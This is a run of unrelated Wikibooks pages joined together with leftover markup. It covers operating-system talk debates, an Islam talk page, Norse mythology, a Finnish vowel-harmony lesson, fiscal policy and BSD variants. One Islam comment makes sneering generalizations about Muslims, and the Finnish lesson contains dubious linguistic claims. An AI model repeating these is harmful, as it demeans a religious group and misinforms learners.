* There is no OS called Linux in this world, Linux is name of the kernel which is a small part of the OS (if you call the OS linux the you should call windows kernel.dll and OS X -&gt; MAC-3, name of the respective kernels). Word linux for OS is a misnomer, It is a GNU OS with linux kernel. GNU OS also runs with BSD kernel and HURD kernel. I believe this needs to be clarified in the document. The OS is called GNU/Linux and not Linux.

*:Being a Linux&amp;reg; developer for a decade, I happen to know this is wrong. I was there; were you? 
''I was in primary school then, but does that matter?''
It is traditional for the term &quot;OS&quot; and the name of any particular OS to refer both to the kernel and to the system in general. Sorry if you don't like that, but that's the way it is. When Linux&amp;reg; was being formed, people like Theodore T'so and H. J. Lu went looking for userspace code. This is much like AT&amp;amp;T and Sun did in grabbing BSD code, much like Richard Stallman planned to do, and of course the obvious thing that anybody would do. Some code, none of it being terribly special, came from the GNU project. Please note that a BSD C library existed, and the gcc compiler was not exactly a major undertaking. The code you see today exists primarily by the efforts of companies that consider themselves to be Linux&amp;reg; vendors. The core Linux&amp;reg; developers, to this very day, do not use the term &quot;GNU/Linux&quot;. A good number of them seem to find it offensive. What you are seeing here is a political power grab. Richard Stallman has even changed some of the FSF software and licenses in an effort to force his views on the world. Even if the idea of cobbling together a full system from available parts was unique to Richard Stallman (hah!), he would still have no moral right to rename the efforts of others. The Hurd has swiped many parts (ext2 driver, hardware drivers, TCP/IP...) from Linux&amp;reg;, yet Richard Stallman refuses to acknowledge this in the name of ''his'' OS. Apparantly he doesn't see the hypocracy. One final thing... the term &quot;GNU/Linux&quot; is a violation of the Linux&amp;reg; trademark. You're not allowed to abuse a trademark like that. [[User:AlbertCahalan|AlbertCahalan]] 06:51, 26 Apr 2005 (UTC)
''I believe its your preference (and respect it), if you want to call the whole system Linux, but I would be nice if we clarify in the document the system known as Linux&amp;reg has Linux kernel and other SW which comes from other sources. So that next time a Apache bug is published people do not think it as a Linux bug. May be GNU/Linux is violation of trademark (do not know legal issues).'' 

* Linux is Open Source SW -&gt; Linux Kernel and most of the SW comes under GPL hence its a Free SW and not Open Source. There is a subtle difference bw Free and Open Source but subtituting one for other leads to mis information. (SW like Mozilla, covered by MPL, BSD etc are open source but not Free).

*:When using the term &quot;operating system&quot; to mean the whole system, Mozilla is included. It comes on the same CD-ROM as everything else and it gets installed along with everything else. There are other examples if you now suddenly wish to use a restrictive definition of &quot;operating system&quot;. So it is correct to use the term &quot;Open Source&quot;. [[User:AlbertCahalan|AlbertCahalan]] 06:51, 26 Apr 2005 (UTC)
''again from purely technical accuracy point of view shouldn't we tell that stuff like Kernel, gcc gnome etc are Free SW while mozilla etc are open source, and pointg the readers to definitions and difference between two.
''
These are the major concerns that I have, I hope you would correct it as soon as possible so that it becomes more factual.

:Let's not perpetuate Orwellian newspeak, political correctness, and similar. Linux&amp;reg; is an OS developed by Linus Torvalds and others. [[User:AlbertCahalan|AlbertCahalan]] 06:54, 26 Apr 2005 (UTC)

''Agreed may be these details are out of scope of the document but I believe they would add technical accuracy to it. Besides my intent has been to point out this rather than promoting any point of view.''

The notion of technical accuracy applied to political information like Free vs Open and Linux vs GNU / Linux is ludicrous. And who cares anyways?

The subject of OSes is more than large enough to deserve several books devoted to it. And those books have more merit that stay away from politics. There are a thousand websites where users can educate themselves about the politics of FLOSS and Linux, why should all that crud be reproduced here? It boggles the mind. A book on the politics of OSes has about as much educational value as The Book of Crime.

If you want to discuss the politics of OSes, move it to a more aptly named book, like The Politics Of Operating Systems, then at least people could stay away from the book since they'd know it had nothing of interest. Truth in advertising is a good idea!

==== &quot;Red Hat GNU/Linux&quot; vs. &quot;Red Hat Linux&quot; ====

Someone renamed all the Linux distributions:
http://en.wikibooks.org/w/index.php?title=A_Neutral_Look_at_Operating_Systems&amp;diff=0&amp;oldid=137024

While I admire the [[:w:Be Bold]] technique of *doing* something rather than whining about it on the talk page, I reverted those changes.

In my opinion, people that make stuff can call it whatever counter-intuitive, incorrect name they want. Does &quot;mince meat pie&quot; ([[Cookbook:Mincemeat Tart]]) actually have any meat in it ? No. But when a chef gives me tasty pastries, I let him call it whatever he wants to call it. [To go a little off topic, it's called [[Mincemeat]] because traditionally it was actually made with meat, and I don't just mean suet.  Disgusting idea, I know]

This thing may, technically, be a &quot;GNU/Linux&quot; distribution from &quot;Red Hat, Inc.&quot;. But if the people that make it give it the name &quot;Red Hat Linux&quot;, then that is its name. They are, of course, free to change that name to something technically more accurate.

--[[User:DavidCary|DavidCary]] 07:33, 8 Jun 2005 (UTC)

Worse than that: the whole &quot;GNU/&quot; thing is Stallman's personal and illegitimate effort to take credit for the efforts of others. He's had quite some success pushing the idea with people who don't know the history behind Linux, GNU, BSD, X11, TeX, and all the rest. [[User:AlbertCahalan|AlbertCahalan]] 23:05, 8 Jun 2005 (UTC)

=== To Do List ===
''Hey... I thought I'd add a bit of direction to this before it really gets underway.  Add a few ideas if you have them, and if they seem to be complete, remove them.  Nothing worse than trying to start something that's already finished :P'' --[[User:Noogz|Noogz]] 07:11, 21 Mar 2005 (UTC)

*Write information on various Linux distros.  Debian is already here(''writing something about Debian-based systems? Ubuntu, etc.''), but I'd like to see the rest of the Big 6 (Red Hat, SuSE, Mandrake, Gentoo and Slackware) get some info; even add a few of the BSD's.  If this does happen, seperate the BSDs from the Linucies under the &quot;Open Source&quot; heading.
*Write info on differences between versions of Windows (e.g. Why one should upgrade from 98 to XP).
*Explain (dis)advantages of both proprietary and FLOSS OSes (IN GENERAL).
*Identify strengths/weaknesses of each system (e.g. OS X is good for Multimedia; Windows is good for Gaming).


::&quot;Why one should upgrade from 98 to XP&quot;&lt;BR&gt;
::Was _THAT_ an _UP_grade?

Absolutely not. Nothing on that list should be in this book. Even proprietary vs FLOSS is a general software development issue and has nothing to do with operating systems. If you're going to write a book about operating systems and you're going to bother calling it &quot;neutral&quot;, there shouldn't be any irrelevant political crap.

=== Structure ===

The strucure of your book is somewhat wrong, as the for-profit Linux distributions are still GNU/Linux operating systems, and Mac Os X is still a BSD operationg system based on an open source core. I propose the following structure instead:

#Windows-based OS
##MS WinXP/Win2003
#Unix-based OS
##Solaris
##BSD
###partly proprietary distributions
####Mac OS X
###free distributions
####FreeBSD
####NetBSD
####OpenBSD
##GNU/Linux
###partly proprietary distributions
####Red Hat and Fedora
####SUSE
###free distributions
####Debian
####Slackware
####Gentoo
####Mandrake

----
The structure of the book isn't &quot;somewhat wrong&quot;, it is grossly and egregiously wrong. The notion that &quot;for profit&quot; and &quot;open source&quot; (political monikers) have anything at all to do with the nature of operating systems is contemptible. Whoever made the current structure demonstrated cynicism equal to the most corrupt politicians in history. This isn't an advocacy page for Linux goddamnit!

The list should be structured historically, with Unix under a single heading and including both Linux, BSD and Unix System V as subheadings. There should be absolutely no mentions of Redhat, Gentoo or other distributions. There should be a Unix-like category to have somewhere to put Plan 9. DOS falls into the category of CP/M derivatives and hence so do Windows and ReactOS. OS/2 should be put under CP/M-like. Mac should be in its own category, with OS X being shared between Mac and Unix.

As for Kernigh's claim that &quot;there are no OSes missing&quot;, it's obvious that he knows nothing about operating systems. There's no mention of EROS, Plan 9, or QNX. And that's just modern OSes.

:Oops... what I meant by &quot;no OSes missing&quot; was that there would be no OSes in the book that are not linked from the TOC. It is obvious that there are some OSes missing from the book. --[[User:Kernigh|Kernigh]] 20:27, 24 October 2005 (UTC)

:Welcome to Wikibooks! It would improve this book if you contributed sections for EROS, Plan 9, QNX, and other systems. Also, the split between &quot;proprietary&quot; and &quot;open source&quot; in this book should leave. It does not work because &quot;proprietary&quot; Mac OS X contains some open source code while &quot;open source&quot; Linux distributions sometimes have proprietary code. Meanwhile, the Unix-likes are forced to split into two group. The Unix-likes should be together.

:I have restored the old TOC to [[A Neutral Look at Operating Systems]]. I suggest that someone restructures the TOC to be better. Once the new TOC is finished, remove the old TOC. --[[User:Kernigh|Kernigh]] 20:27, 24 October 2005 (UTC)

==== New Structure, Redirects, and Red Links ====

I have rearranged the pages, abolishing the separation between &quot;Proprietary OSs&quot; and &quot;Open Source OSs&quot;. Here is the list of redirects which I created when I moved the pages. --[[User:Kernigh|Kernigh]] 04:51, 14 November 2005 (UTC)

I left some operating systems in the TOC as red links with Wikipedia articles (including ones from &quot;Proprietary OSs&quot; that were only Wikipedia links). If you have a better idea, then edit the page. --[[User:Kernigh|Kernigh]] 04:51, 14 November 2005 (UTC)

=== Neutrality ===

A neutral look on Operating Systems should start with a definition of an operation system and the mechanisms that are used by them.  This is independent of the Operating System.  Next, each Operating System could be discussed in function of these mechanisms.
For example: task scheduling.  There are many kinds of the (round robin, multiple priority round robin, etc.).  Of course, these 'general' pages could be constructed while developing the specific ones.

''The notion that an operating system can be characterized by a long list of functions and mechanisms is ludicrous. These things are utterly trivial and nobody would learn anything of any significance from such a book. Are you writing a book about operating systems or an outdated technical spec that nobody will use? OSes are characterized by the '''concepts''' and '''principles''' they use.''

''So for example, there are functional OSes, there are object oriented OSes, there are OSes with capabilities, there are stateless OSes and stateful OSes, there are uniform OSes and non-uniform OSes.''

:In theory, but not in practice. EROS and KeyKOS are going nowhere. I see that you wish this to be a book about failed OS experiments. Back in the real world though, we do have more than just UNIX and Windows. Look at embedded systems. We have [[w:ThreadX|ThreadX]], [[w:VxWorks|VxWorks]], [[w:Palm OS|Palm OS]], [[w:Symbian OS|Symbian OS]], [[w:QNX|QNX]], [[w:Cisco IOS|Cisco IOS]], MC/OS, [[w:Virtual Real-Time Executive|VRTX]], and [[w:TRON_Project|TRON]]. TRON is the world's most popular OS! [[User:AlbertCahalan|AlbertCahalan]] 23:28, 24 October 2005 (UTC)

''The principle embodied by Plan 9 for example is that everything is a file(system). The previous sentence almost completely characterizes Plan 9, where a long dissertation of &quot;mechanisms&quot; would only serve to DISinform and UNeducate people.''

''As for the definition of an OS, which one should that be? Would that be the one made in the early early 70s that no longer applies? Or do you want to go the radical route and provide an actually useful, practical and informative definition? On the, frankly non-existent, chance that you want to be useful and informative, an Operating System is:''

  '''A set of principles and concepts and all of the software which obeys these principles.'''

''This definition explains why X Window is not part of Unix but 8 1/2 is part of Plan 9.''

:Well, it includes the web browser. I've read sworn testamony that attests to this. The practical answer is that the OS is whatever you get on that first set of CDs, no more and no less. [[User:AlbertCahalan|AlbertCahalan]] 23:28, 24 October 2005 (UTC)

::I do not expect that we will find a perfect abstraction to describe operating systems.

=== What Distinguishes Two Operating Systems ===

Someone restored the obsolete TOC and justified it by writing
&quot;It contains some operating systems that are not yet moved to the new version.&quot;

This is ''factually'' wrong. We aren't interested in the various versions of BSD and they do not merit the appelation of different OSes. They're the same OS. So are all of the Linux distros. They're all the exact same OS just configured slightly differently. You might as well be talking about the differences between different patch versions to Windows 98.

The only distribution of Linux that you'd have even a half chance of arguing is a different OS is RtLinux, and you wouldn't have that chance with anyone that's studied OSes (as opposed to someone that's studied Unix - and how typically provincial of Unixers to think that they're the center of the universe!). None of the Unixes (System V, Solaris, Linux, BSD, even AIX while we're at it) are appreciably different from each other, they're all exactly the same OS.

The minimum distance between two branches of an OS tree that distinguishes different OSes is that between Unix and Plan 9. We should apply the same standards to OSes that we apply to biological species, whether they can interbreed. Since software for any Linux distribution is ''binary-compatible'' with any other Linux distribution, it is obviously the same species of OS. Since software for any Linux is source compatible with any other Unix, all Unixes are still the same OS.

You only start getting a different OS when you look at HURD, QNX, VSTa, or Plan 9, all of which are Unix derivatives. And these are different OSes because software for one requires porting to run on another.

There is vastly more difference between VisualWorks Smalltalk and Dolphin Smalltalk than there is between two clones of Unix, and all dialects of Smalltalk are still considered the same language. This is especially relevant since you can treat languages as operating systems and vice versa.

=== Proposal to Rename the Book ===

24.200.176.92 recently proposed the renaming of this book to ''A Political Look at Mainstream End-User Operating Systems''. The proposal was made at [[User talk:Kernigh]]. I am currently opposing the rename because I think that it would limit contributions to this book. --[[User:Kernigh|Kernigh]] 03:44, 27 October 2005 (UTC)

I don't think we should be so unhesitant to supply an audience for this rude user. The suggestion was not made in a serious and constructive manner. Turning the book into a list of failed OS experiments is no more useful than turning it into yet another Linux-versus-Windows, Linux-versus-BSD, or Linux-distribution-table. [[User:AlbertCahalan|AlbertCahalan]] 04:22, 27 October 2005 (UTC)

''I was rude to Kernigh. To you I was merely brutally honest. You have contributed nothing of any interest to this book and this book as it is currently construed, and as you wish to preserve it, has nothing of interest to contribute to the world. So it's funny how I was rude to the guy who didn't complain and not rude to the ham-fisted lout that responded with force.'' [[User:24.200.176.92|24.200.176.92]] 01:51, 28 October 2005 (UTC)

This should be called A Look At Operating Systems for x86. You've left out the operating system that runs 99% of the world's financial transactions and most other commercial activity (z/OS).

:I agree slightly. Wikibooks should already strive to be neutral. I believe the current title, &quot;A Neutral Look at Operating Systems&quot; is redundant. I agree with the anonymous person above except that to avoid confusion call it &quot;An Overview of Operating Systems for PCs&quot; or something like that. x86 architecture is not implied with all the OS's shown. However I believe this book seems to be mainly looking at personal computers. Correct me if I'm wrong- I haven't read the whole thing. --[[User:Evolutionist79|Evolutionist79]] ([[User talk:Evolutionist79|discuss]] • [[Special:Contributions/Evolutionist79|contribs]]) 20:37, 26 April 2011 (UTC)
::Other operating systems omitted include zVSE, TPF and zVM for mainframes, i(5) for the AS400 and OS/2.  Perhaps their omission can be justified by the dirth of publications on the internal structure and logic of these widely used, proprietary operating systems.[[User:Ccalvin|Ccalvin]] ([[User talk:Ccalvin|discuss]] • [[Special:Contributions/Ccalvin|contribs]]) 12:31, 6 March 2013 (UTC)</text>

      <text xml:space="preserve">It would be a good idea to start some independent research on the islam. Because I want to know how fullgrown people can believe this? I want to know what is the real reason behind it, and why do so many people in poor counties go over to the islam. Why do people in industrialized countries with no future and no hope convert to islam instead of geting an education to fight their situation. Furthermore it would be very interesting to know why the followers of Mohammed dislike philosophy.

Steven &lt;small&gt;&lt;span class=&quot;autosigned&quot;&gt;—Preceding [[w:Wikipedia:Signatures|unsigned]] comment added by [[User:83.128.15.170|83.128.15.170]] ([[User talk:83.128.15.170|discuss]] • [[Special:Contributions/83.128.15.170|contribs]]) 08:25, 21 March 2005&lt;/span&gt;&lt;/small&gt;

:''I want to know what is the real reason behind it, and why do so many people in poor counties go over to the islam.'' The countries of the [[w:Gulf Cooperation Council|Gulf Cooperation Council]], including [[w:Saudi Arabia|Saudi Arabia]] where [[w:Mecca|Mecca]] and [[w:Medina|Medina]] are located, are wealthier than most parts of the world, though less wealthy than the [[w:G8|G8]]. Some poor countries, like [[w:Afghanistan|Afghanistan]] and [[w:Mauritania|Mauritania]], have a Muslim majority, but some, like [[w:Haiti|Haiti]] and [[w:Democratic Republic of the Congo|Democratic Republic of the Congo]], have few Muslims. --[[User:Kernigh|Kernigh]] 17:05, 5 February 2006 (UTC)

== Merge to [[Wikibooks:Humanities bookshelf]] ==
I think that most users look for books on a bookshelf, which makes these Islam books difficult to find. I have marked the module {{tl1|mergeto|Wikibooks:Humanities bookshelf}} and I suggest moving the Islam books to that bookshelf and redirecting the [[Islam]] module to the bookshelf. --[[User:Kernigh|Kernigh]] 17:05, 5 February 2006 (UTC)</text>

Regarding &quot;2. Never pronounce the words. Your mouth should be absolutely still.&quot;:
If I remember rightly, Tony Buzan's speed reading book isn't at all worried about ''sub''vocalisation. In fact it encourages it. I suppose the argument above applies only to actual physical vocalisation, as the voice in your head can go as fast as you like.

==Hopping brain==

I would dispute the statement that &quot;the brain is faster than the eyes&quot;.  It is impossible to move the brain.  It really just sits there in the brain case.  But the eyes rotate and succade quite fast. Regards, June.

:I guess the idea is that the brain can handle more characters per second (a speed measure) than the eyes can supply.

::The brain does actually move around a lot inside the head, but suggesting it can keep up with the eye is quite ridiculous. I can skim over this page quite easily with my eyes, but my brain can't put the information together fast enough for it to have any meaning.

==Two words at a time==

From the text: ''Reading research shows that it is possible to read as many as two words at one time. So keep practicing.'' Haha, clearly it is possible to take in more than two words in a glance. But I find this pessimistic statement incredibly amusing... it really adds to the character of the book I had in mind long time ago when I started it. I wanted the book to be simple and sound without the typical &quot;you'll be a millionaire and have fantastic sex in 21 days&quot; pitch. -Daniel</text>

      <text xml:space="preserve">== Norse culture and language, basics of Norse mythology ==
Norse mythology refers to the pre-Christian beliefs of the Scandinavian people. It is the most well known version of the older mythology common to the germanic tribes, including the closely related anglo-saxon mythology. The language spoken during the period that the norse gods were worshipped, was Old Norse. By the time this language split up into different languages (not including dialects), Christianity had taken root in much of Northern Europe.

== Sources ==
Originally, much of Norse mythology consisted of spoken legends, told from the elders and parents to the children, and that way passed on. However, some of it is written, like the Eddas and the first part of Heimskringla (written by Snorri Sturlason between 1220 and 1230 on Iceland), which is also known as The Norwegian King Sagas, as it tells about the Norwegian kings, and their supposed relation to the Gods. The original title of this work is not known, as the oldest version lacks the title page, and starts with &quot;Kringla Heimsis&quot;.
Other than this, there are also runestones, which for practical reasons cannot contain very much information, and the surviving myths and folklore.

== The universe as seen by the believers of norse mythology ==
The universe was believed to be a collection of flat, circular discs, known as the nine worlds. The worlds were:
 Alfheim          World of the Light Elves
 Asgard           World of the Aesir
 Jotunheim 	 World of the Giants.
 Midgard 	 Home of mankind. 
 Muspelheim 	 World of fire and the fire-giants, home of the giant Surt.
 Nidavellir 	 Home of the Dwarves
 Niflheim 	 World of the ice and that of the dead, which is also known as Hell.
 Svartalfheim 	 World of the Dark Elves
 Vanaheim 	 Home of the Vanir

All the nine worlds were connected by the World Tree, or Yggdrasill, the roots and branches connecting the different worlds.

In Niflheim, the dead resided. However, unlike the stories known today of Hell (notice ''Hel'' versus ''hell''), Niflheim was a material place located in connection with the other worlds.  
Surrounding Midgard it was believed a Giant worm lived near the edge of the plate, Midgardsormrinn. 
In the beginning, there was nothing but an endless void, called the Ginnungagap, and Muspelheim and Niflheim, terrible worlds of pain. Out of this void came Ymir, the first living creature. He was a giant, and became the father of the race of frost giants. Ymir was the father of a six-headed son that was nourished by a cosmic cow called Audumla. Audumla fed herself by licking the salty rime-stone, until that stone was licked into a shape of man. This stone-man was named Buri and he was the first primeval god. Buri was the father of Bor. 
Bor married the giantess Bestla, and became father of Odin, Ve and Vili. 
After a time, Ymir grew so evil and large that the three gods slew him, and used him to create the universe. Midgard was created by Ymir's eyebrow as a place for the humans to dwell. The first humans were Ask (ash) and Embla (elm). 
Sol is the goddess of the Sun, riding the heavens. Her brother Mani, is the moon. It's easy to trace the present day Norwegian words Sol (sun) and måne (moon) to these norse gods.

== War of the Aesir and Vanir ==
The war between the Aesir and Vanir started when the Aesir, tired of her endless talk about gold and wealth, tortured the Vanir goddess Gullveig. When the Vanir demanded equal status as the Aesir, the war broke out. [not finished]

These notes are stupid, and they break the spirit of wikipedia. It is an abuse to adopt an esoteric formatting convention that will exclude users, and a total maintenance nightmare to keep it in sync. Consider revisiting when wiki books further matures.

      <comment>Adding {{WikiProject Languages}}</comment>
      <text xml:space="preserve">{{WikiProject Languages}} 

This is just a list of &quot;For X ... we use Y&quot; which isn't very helpful for the learner.  I think it needs to be compiled into a table.  I'm learning Chinese and its quite unhelpful to have to remember measure words seperate from the nouns to which they relate.  Ideally after measure words are introduced all further nouns introduced as new vocabulary should have their measure words with them.

--[[User:Glisher|Glisher]] 13:06, 21 Mar 2005 (UTC)

I'd like to second Glisher's remark and take it one step further. It would be very helpful to have access to an online (or downloadable) chinese dictionary that includes the measure words with the noun. The two resources I am using: zhongwen.com and NJStar bilingual dictionary fail in this regard, which is surprising to me (i am a beginner). Can some kind person direct me to a suitable resource? Many thanks.

      <text xml:space="preserve">[[Finnish|^^Contents^^]] [[Finnish/Nimet ja kansalaisuudet|&lt;&lt;What is your name?]] | '''Grammar-Vowel harmony''' | [[Finnish/Grammar-Suffixes|Grammar-Suffixes&gt;&gt;]]

----
== Vowel Harmony ==

Finnish, like all Finno-Uralic languages, has vowel harmony and it affects what vowels go with which words. It also affects the postpositions and endings of words.
 
In Finnish, there are eight vowels, '''a, e, i, o, u, y, ä''' and '''ö'''. They are grouped into three groups; front, neutral and back vowels. See the diagram:

[[File:Finnish vowel harmony Venn diagram.svg|centre|225px]]

The vowels in blue are front vowels (or &quot;hard&quot;), the vowels in green are neutral and the vowels in yellow are back vowels (or &quot;soft&quot;).

In Finnish, single words contain only vowels of the same type as the initial, stressed syllable. So, for example, the word,  '''aaltoileva''' contains only neutral and back vowels, while '''äidillä''' contains only front and neutral vowels. With respect to vowel harmony, compound words are separate words, e.g. '''''työmaa''''', with '''''-ta''''' suffixed '''''työ|maa|ta'''''.

When a word contains only neutral vowels, its suffixes use front vowels. For example, when the postposition '''''-lla''' or '''-llä''''' is added to '''kieli''', it becomes '''kielellä''', not '''kielella'''.

As a consequence, Finnish speakers often have trouble pronouncing foreign words which do not obey vowel harmony. For example, some Finns may pronounce ''olympia'' as ''olumpia'' because of the difficulty in producing the sounds of ''o'' and ''y'' in a row. 

Vowel harmony applies to foreign words, too. For example, ''chat'' is heard as '''''tsät''''' and consequently the frequentatitive verb &quot;to chat&quot; is '''''tsättäillä''''' (also spelled chattäillä, chattailla, chättäillä, etc.). (Note: Is this really about &quot;vowel harmony&quot; if there's only one vowel in the word &quot;chat&quot;? ''ch'' turns into ''ts'' because producing the ''ch'' sound takes effort, and ''ts'' does not.)

== Mutations ==
 
=== i → e ===

You may have noticed that '''nimi''' (name) changes to '''nimesi''' (your name), and '''Suomi''' (Finland) changes to '''Suomesta''' (from Finland). This is because there is an i → e mutation. This mutation is where on some suffixes like '''-n''', '''-a''', '''-ä''', '''-si''' changes the last vowel from i to e. 

This is a slight verbal mutation that makes this change in the word, that is reflected in this mutation. It affects words that are less than two syllables and it usually is the &quot;old&quot; words like '''nimi''' and '''suomi''' and it is something that you have to learn by heart because it is not regular. The word '''taksi''' (taxi) does not change to '''taksessa''' (because it is a new loan word), instead it is '''taksissa'''.

=== The k, p and t mutation ===

Like the i to e mutation, when you put a suffix after a word, some consonants change when you agglutinate. For example '''Helsi''nk''i''' changes to '''Helsi''ng''issä''' after you put a suffix, here '''-ssä''', after it. This is called ''consonant gradation'' and it mainly affects the consonants '''k, p''' and ''' t'''. So words like '''pan''kki''''' change to '''pan''kin'''''. Here is a short, not a complete list:

{| border=&quot;1&quot; cellpadding=&quot;2&quot;
!initial ending
!new ending
!result
|-
| -kk:
| -k:
|'''pankki → pankista''' (bank → from the bank)
|-
| -pp:
| -p:
|'''kauppa → kaupasta''' (shop → from the shop)
|-
| -tt:
| -t:
|'''tyttö → tytön''' (girl → girl's)
|-
| -nk:
| -ng:
|'''Helsinki → Helsingistä''' (Helsinki → from Helsinki)
|-
| -uku/-yky:
| -uvu/-yvy:
| '''puku → puvusta''' (suit → from the suit)
|-
| -k:
| -:
|'''Turku → Turusta''' (Turku → from Turku)
|-
| -t:
| -d: 
|'''katu → kadulta''' (street → from the street)
|-
| -p:
| -v:
|'''hupi → huvit''' (amusement → amusements)
|-
| -rt:
| -rr:
| '''murto → murron''' (break-in → of the break-in)
|-
| -ti
| -si
| '''löytää → löysi''' (to find → found)
|}

== End Note ==

Now there is a lot to go through, but take your time and hopefully this will help you to no end. But beware that there is more to go through, as we haven't covered the suffixes yet!

Fiscal Policy concerns the use of changes in the amount of government spending, &lt;b&gt;G&lt;/b&gt; and taxation &lt;b&gt;T&lt;/b&gt; to influence the national economy. This policy can affect both Aggregate Demand (&lt;b&gt;AD&lt;/b&gt;) and Aggregate Supply (&lt;b&gt;AS&lt;/b&gt;), though it is worth noting that the affect on AD is much more direct and immediate, whereas AS is affected through indirect means over a greater period of time. It is also just about impossible to isolate the two effects - any change in fiscal policy will ultimately affect both AD and AS.

==Aggregate Demand==
As we already know, &lt;b&gt;AD = C + I + G + (X - M)&lt;/b&gt; where 'G' stands for government spending. Taxation is accounted for in the affect it has on the other components of aggregate demand (for example, consumption will fall if more is spent in paying taxes!).

Increases in government spending will increase aggregate demand, which will have affects on the economy overall. It leads to an increase in output and average prices, other things being equal. However, the degree to which output/prices rise depends on the elasticity of AS. This can be easily shown on an AD-AS diagram: [[Image:Aggregate_Demand-Aggregate_Supply.jpg|right|thumb|400px|AD-AS diagram]] If Aggregate Supply is elastic, a large increase in output may result with little risk of inflationary pressures. However, if AS is inelastic increased government spending may not be the best way of boosting the economy, as it is at risk of 'overheating' - that is, at risk of causing inflation rather than growth in output.

Similarly, a fall in government spending will 'cool' the economy, and cause a contraction in AD: &lt;i&gt;diagram&lt;/i&gt;

==Aggregate Supply==
Specific changes in fiscal policy can be used to affect aggregate supply:
===Capital Spending===
Government spending on infrastructure, such as new transport networks, increases the potential output of an economy. Also, lower corporation taxes mean that businesses can invest greater sums at the same time, contributing both to AD and AS.

Capital spending could also include investment in 'human capital', such as retraining, higher education and vocational training as ways to increase the supply of labour, reduce unemployment and provide a more productive workforce. Human capital is becoming ever more important as many developed countries now aim for a knowledge-based economy, in which labour is more productive.

===Workforce Incentives===
Changes in the benefits system, such as a reduction in income tax, could create greater incentive for individuals to return to work. This increases labour supply, and hence overall supply as labour is a factor of production. It could be argued that &lt;b&gt;welfare and benefit reform&lt;/b&gt; is more important ie. fewer benefits for the unemployed to incentivise them to work.
===R&amp;D and Innovation===
Increased G could encourage developments in technology, which also increase the potential output of an economy, though without an accompyaning increase in demand, this will only increase 'slack' in the economy, reducing inflationary pressure, rather than an actual increase in total output.

These AS effects are dependent upon carefully &lt;b&gt;targetted government spending&lt;/b&gt;, and it is important to note that government spending alone will not necessarily affect AS.

==Fiscal Policy Terms==
*&lt;b&gt;Expansionary Fiscal Policy = G &gt; T&lt;/b&gt;. That means that government spending is greater than the rate of taxation, so it is a boost to the economy. The disadvantage to this is that a &lt;b&gt;budget deficit&lt;/b&gt; will ultimately build up
*&lt;b&gt;Contractionary Fiscal Policy =  G &lt; T&lt;/b&gt;. This has a contractionary, deflationary effect on the economy, but it will improve the government finances over time

      <comment>/* DragonFly BSD */</comment>
      <text xml:space="preserve">{{A Neutral Look at Operating Systems}}

{{TODO|todonote=Add Darwin. Also add non-free BSD variants (now that this page is moved out of &quot;Open Source OSes&quot; hierarchy).}}

The BSDs originate from the custom [[w:Unix|Unix]] distribution created at the University of California at Berkeley. The distro was called the [[w:Berkeley Software Distribution|Berkeley Software Distribution]]. Because BSD was a modified Unix, it was only available to those with Unix source code licenses from AT&amp;T. Later versions of BSD became free software without any AT&amp;T code.

Today, there are four main free operating system projects derived from BSD. This page also mentions three other distributions based on those projects. They all have Wikipedia articles: [[w:DragonFly BSD|DragonFly BSD]], [[w:FreeBSD|FreeBSD]], [[w:PC-BSD|PC-BSD]], [[w:DesktopBSD|DesktopBSD]], [[w:NetBSD|NetBSD]], [[w:OpenBSD|OpenBSD]], [[w:MirOS BSD|MirOS BSD]].

These are also called *BSD projects because they have &quot;BSD&quot; at the end of their names to show their ancestry. The BSD licensing allows for almost any redistribution and modification. Thus, the BSD projects frequently take code from each other; a new feature from one BSD project might appear later in the others.

BSDs are distributed as complete operating systems with kernel and userland. The BSD projects provide a &quot;ports tree&quot; with Makefiles that automate downloading, patching, building, and installing software and handling dependencies; [[w:FreeBSD Ports Collection|FreeBSD ports]] and [[w:Pkgsrc|NetBSD pkgsrc]] are examples. They also provide binary packages of popular ports.

== DragonFly BSD ==

[http://www.dragonflybsd.org DragonFly BSD] is the newest of the four projects. It was started in 2003 as a fork of FreeBSD 4.X by developers that wanted changes in the system design. They are still working on their goals. The following is from [http://www.dragonflybsd.org/goals/ their goals page]:

:''DragonFly is going to be a multi-year project. It will take a lot of groundwork to even approach the goals we outline here. ... First and foremost among all of our goals is a desire to be able to implement them in small bite-sized chunks, while at the same time maintaining good stability for the system as a whole. ... It's a laudable goal that will sit foremost in our minds, even though we know it is probably not 100% achievable.''

== FreeBSD ==

[http://www.FreeBSD.org FreeBSD] is a high-performance system and regarded as one of the most mature and robust network operating systems. (Some of its clients, such as [http://www.Yahoo.com Yahoo!] seem to agree.) It also has many of the portability advantages of NetBSD and security advantages of OpenBSD.

Here are examples of features that reached FreeBSD before the other BSD projects.
*FreeBSD was the first system with a [http://www.freebsd.org/ports/index.html ports collection] based on Makefiles. This assisted in porting Unix software to FreeBSD and installing it. The ports trees of the other BSD projects are derived from this one.
*FreeBSD was the first to have the [[w:Soft Updates|soft updates]] feature to improve disk performance and recovery of filesystems from system crashes.

=== PC-BSD ===
[http://www.pcbsd.org/ PC-BSD] is a project to build a system based on FreeBSD and KDE. It is very easy to install. After the other BSDs are installed, they give the user only a root shell prompt, and no graphical user interface is configured. After installing PC-BSD, a KDE desktop environment is already configured. PC-BSD also has a graphical installer which helps the user create a first non-root user account and includes customizing BSD disklabel.

PC-BSD users can download *.pbi files, double-click their icons, and install them as binary packages. This is a rare feature among BSD and even Linux distributions, but common on Windows and Mac OS X. Optionally, KDE menu and desktop items are created. Not only are the *.pbi packages available, but the FreeBSD ports collection is also available.

Both OS installation and *.pbi files are demonstrated in the [http://www.pcbsd.org/index.php?p=tour PC-BSD tour].

=== DesktopBSD ===
Another project was started with a goal to provide user-friendly BSD system. [http://www.desktopbsd.net DesktopBSD] was started independently from PC-BSD and these two projects still remain separate. Similarly, DesktopBSD provides easy-to-use graphical installer and installs fully configured desktop system based on KDE.

DesktopBSD developed its own graphical tools integrated with KDE: ports manager, disk mounter and network configuring tool.

== NetBSD ==
The focus of [http://www.NetBSD.org NetBSD] is to provide a stable, [[w:Multiplatform|multiplatform]], research and server operating system. NetBSD is widely regarded as being one of the most portable operating systems.

NetBSD runs on a very wide variety of architectures. There are at least 54 architectures including some very exotic ones such as the Sega Dreamcast. These architectures involve at least [http://www.netbsd.org/Ports/#ports-by-cpu 17 processor types]. These platforms are supported from a single CVS tree, avoiding the need for third party patches to use various hardware. The higly cross-compilable system (with full toolchain), and excellent documentation make it very useful for developers.

The NetBSD packages collection, pkgsrc, is also portable. pkgsrc supports the other BSDs, Linux, Darwin, and Solaris.  A bootstrap script is provided as part of pkgsrc to adapt it to the host OS and build the necessary support tools.

